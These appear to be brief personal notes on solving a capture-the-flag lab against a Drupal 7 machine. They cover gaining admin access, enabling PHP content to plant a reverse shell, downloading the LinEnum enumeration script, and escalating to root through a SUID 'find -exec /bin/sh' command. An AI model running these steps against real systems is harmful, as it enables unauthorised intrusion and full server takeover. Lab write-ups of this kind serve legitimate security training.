drupal 7
tried unserialize for drupal 8 -> nothing

use script with test:test

test -> admin

in flag3:
Special PERMS will help FIND the passwd - but you'll need to -exec that
command to work out how to get what's in the shadow.

-> modules to allow php content then add reverse shell

shell as www-data -> /home/flag4/flag4.txt:

Can you use this same method to find or access the flag in root?

Probably. But perhaps it's not that easy.  Or maybe it is?
```

python -c 'import pty; pty.spawn("/bin/bash")' -> easier
cd /var/www

curl http://192.168.1.85/linenum.sh -> doesnt work
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
bash script -> suid files

find is vulnerable
find . / -exec /bin/sh \;

-> root

/passwd
